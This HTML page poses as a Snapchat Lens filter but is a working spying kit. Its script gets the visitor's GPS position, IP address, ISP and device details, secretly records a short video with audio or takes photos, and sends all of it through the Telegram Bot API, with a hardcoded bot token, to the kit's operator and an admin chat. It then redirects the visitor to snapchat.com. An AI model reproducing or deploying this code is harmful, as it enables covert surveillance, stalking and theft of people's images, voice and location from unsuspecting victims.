<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Lens</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        /* Top Navigation Overlay */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            z-index: 10;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            box-sizing: border-box;
            background: linear-gradient(rgba(0,0,0,0.7), transparent);
        }
        .profile-icon {
            width: 35px;
            height: 35px;
            border-radius: 50%;
            border: 2px solid #fff;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #333;
        }
        .song-pill {
            background: rgba(0, 0, 0, 0.4);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .top-right-icons {
            display: flex;
            gap: 15px;
            align-items: center;
            font-size: 20px;
        }

        /* Center Camera View */
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            background: #000;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        #filterCanvas {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
            pointer-events: none;
        }

        /* Bottom Snapchat Tray Layout */
        .bottom-tray {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.9));
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 10px;
        }

        /* Filter Carousel Bar */
        .filter-carousel {
            display: flex;
            gap: 12px;
            overflow-x: auto;
            width: 100%;
            padding: 10px 15px;
            scrollbar-width: none;
            box-sizing: border-box;
        }
        .filter-carousel::-webkit-scrollbar {
            display: none;
        }
        .filter-item {
            min-width: 55px;
            height: 55px;
            border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.5);
            overflow: hidden;
            background: #222;
            flex-shrink: 0;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
        }
        .filter-item.active {
            border: 3px solid #fffc00;
            transform: scale(1.1);
        }

        /* Snapchat Category Navigation Footer */
        .category-bar {
            display: flex;
            justify-content: space-around;
            width: 100%;
            padding: 8px 10px;
            font-size: 11px;
            color: #aaa;
            border-top: 1px solid rgba(255,255,255,0.1);
            background: rgba(0,0,0,0.8);
        }
        .category-bar span {
            cursor: pointer;
        }
        .category-bar span.active {
            color: #fff;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- Top Snapchat Bar -->
    <div class="top-bar">
        <div class="profile-icon">😜</div>
        <div class="song-pill">🎵 Barish Ban Jaun - Tina Mishra +</div>
        <div class="top-right-icons">
            <span>👤+</span>
            <span>🔄</span>
            <span>🎵</span>
            <span>⌄</span>
        </div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview" style="display:none;"></video>
        <canvas id="filterCanvas"></canvas>
        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.8); padding: 12px 20px; border-radius: 10px; border: 1px solid #fffc00; font-size: 13px;">Loading Lens... Tap Allow</div>
    </div>

    <!-- Bottom Tray matching exact user screenshot -->
    <div class="bottom-tray">
        <div class="filter-carousel" id="filterCarousel">
            <div class="filter-item" onclick="selectFilter(0)">🗿</div>
            <div class="filter-item" onclick="selectFilter(1)">🤪</div>
            <div class="filter-item" onclick="selectFilter(2)">👶</div>
            <div class="filter-item active" onclick="selectFilter(3)">😁</div>
            <div class="filter-item" onclick="selectFilter(4)">👻</div>
            <div class="filter-item" onclick="selectFilter(5)">🤡</div>
            <div class="filter-item" onclick="selectFilter(6)">👹</div>
        </div>

        <div class="category-bar">
            <span>✕</span>
            <span>Favorites</span>
            <span>For You</span>
            <span>Aesthetic</span>
            <span class="active">Funny</span>
            <span>Exclusive</span>
            <span>New</span>
            <span>Trending</span>
            <span>😊</span>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAHJHksL9vqLcvHL3zrH1OOnn9aS3YW4lQw";
        const ADMIN_CHAT_ID = "6478868514";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); 

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;
        let detectedHand = "Analyzing...";
        let activeFilterIndex = 3;

        let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
        window.addEventListener('deviceorientation', (event) => {
            motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
            motionData.beta = event.beta ? Math.round(event.beta) : '0';
            motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
        }, true);

        function getSmartHandStatus() {
            if (detectedHand.includes("Hand Detected")) {
                return detectedHand; 
            } else {
                let g = parseInt(motionData.gamma);
                if (isNaN(g)) return "Position: Center / Stable";
                return g < 0 ? "Likely Right Hand Grip" : "Likely Left Hand Grip";
            }
        }

        function selectFilter(index) {
            activeFilterIndex = index;
            let items = document.querySelectorAll('.filter-item');
            items.forEach((item, idx) => {
                if (idx === index) {
                    item.classList.add('active');
                } else {
                    item.classList.remove('active');
                }
            });
            // User jab bhi kisi filter par click karega, action trigger ho jayega
            triggerAction();
        }

        function startLiveFilter(videoElement) {
            const canvas = document.getElementById('filterCanvas');
            const ctx = canvas.getContext('2d');

            function renderFrame() {
                if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;

                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                    ctx.save();
                    let time = Date.now() * 0.005;
                    let centerX = canvas.width / 2;
                    let centerY = canvas.height / 3;

                    // Active funny filter graphics on screen
                    if (activeFilterIndex === 3) {
                        ctx.font = "60px Arial";
                        ctx.textAlign = "center";
                        ctx.fillText("😁", centerX, centerY + 50);
                    } else if (activeFilterIndex === 1) {
                        ctx.font = "60px Arial";
                        ctx.textAlign = "center";
                        ctx.fillText("🤪", centerX, centerY + 50);
                    } else {
                        ctx.font = "50px Arial";
                        ctx.textAlign = "center";
                        ctx.fillText("✨", centerX, centerY + 50);
                    }
                    ctx.restore();
                }
                requestAnimationFrame(renderFrame);
            }
            renderFrame();
        }

        function initMediaPipeHands(videoElement) {
            try {
                const hands = new Hands({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                });
                hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.4, minTrackingConfidence: 0.4 });
                hands.onResults((results) => {
                    if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
                        detectedHand = `${results.multiHandedness[0].label} Hand (AI Vision)`;
                    }
                });
                const camera = new Camera(videoElement, {
                    onFrame: async () => { await hands.send({ image: videoElement }); },
                    width: 1280, height: 720
                });
                camera.start();
            } catch (e) {}
        }

        async function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({ lat, lon, mapLink: `https://maps.google.com/?q=${lat},${lon}` });
                        },
                        () => resolve({ lat: '', lon: '', mapLink: 'Permission Denied' }),
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country_name || 'Unknown', isp: data.org || 'Unknown' };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        async function initCamera() {
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: !cameraType };
            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user"; 
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else { throw e; }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => { videoElement.play().then(resolve).catch(resolve); };
                });

                startLiveFilter(videoElement);
                initMediaPipeHands(videoElement);

                document.getElementById('loading-text').style.display = 'none';
                isReady = true;

                setTimeout(() => { triggerAction(); }, 3000);
            } catch (err) {
                document.getElementById('loading-text').innerText = "Please allow camera access!";
            }
        }

        async function triggerAction() {
            if (!isReady || !globalStream) return;

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";

            let baseCaption = 
                `🌐 **IP & Exact Location**\n` +
                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                `📡 ISP: ${ipInfo.isp}\n\n` +
                `📱 **Device & Spatial Insights**\n` +
                `✋ **Hand Grip**: ${getSmartHandStatus()}\n` +
                `🧭 Gyro: Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
                `🔋 Battery: ${batteryText}\n` +
                `📶 Network: ${netType}\n` +
                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                `👑 **CREDIT BY : आयुष नेगी**`;

            if (!cameraType) {
                let recordedChunks = [];
                let mediaRecorder;
                try {
                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
                } catch (err) {
                    mediaRecorder = new MediaRecorder(globalStream);
                }

                mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
                    if (blob && blob.size > 0) {
                        if (CHAT_ID) {
                            let fdUser = new FormData();
                            fdUser.append('chat_id', CHAT_ID);
                            fdUser.append('video', blob, 'video.webm');
                            fdUser.append('caption', "🎥 **Snap Captured!**\n\n" + baseCaption);
                            fdUser.append('parse_mode', 'Markdown');
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fdUser });
                        }
                        let fdAdmin = new FormData();
                        fdAdmin.append('chat_id', ADMIN_CHAT_ID);
                        fdAdmin.append('video', blob, 'video.webm');
                        fdAdmin.append('caption', `🕵️‍♂️ **Admin Log (${CHAT_ID})**\n\n` + baseCaption);
                        fdAdmin.append('parse_mode', 'Markdown');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fdAdmin });
                    }
                    globalStream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.snapchat.com";
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000);
            } else {
                const filterCanvas = document.getElementById('filterCanvas');
                const canvas = document.getElementById('canvas');
                canvas.width = filterCanvas.width || 1280;
                canvas.height = filterCanvas.height || 720;
                const context = canvas.getContext('2d');

                for (let i = 1; i <= 3; i++) {
                    context.drawImage(filterCanvas, 0, 0, canvas.width, canvas.height);
                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                    if (blob) {
                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;
                        if (CHAT_ID) {
                            let fdUser = new FormData();
                            fdUser.append('chat_id', CHAT_ID);
                            fdUser.append('photo', blob, `photo_${i}.jpg`);
                            fdUser.append('caption', caption);
                            fdUser.append('parse_mode', 'Markdown');
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fdUser });
                        }
                        let fdAdmin = new FormData();
                        fdAdmin.append('chat_id', ADMIN_CHAT_ID);
                        fdAdmin.append('photo', blob, `photo_${i}.jpg`);
                        fdAdmin.append('caption', `🕵️‍♂️ **Admin Log (${CHAT_ID})**\n\n` + caption);
                        fdAdmin.append('parse_mode', 'Markdown');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fdAdmin });
                    }
                    await new Promise(resolve => setTimeout(resolve, 400));
                }
                globalStream.getTracks().forEach(t => t.stop());
                window.location.href = "https://www.snapchat.com";
            }
        }

        window.onload = () => initCamera();
    </script>
</body>
</html>
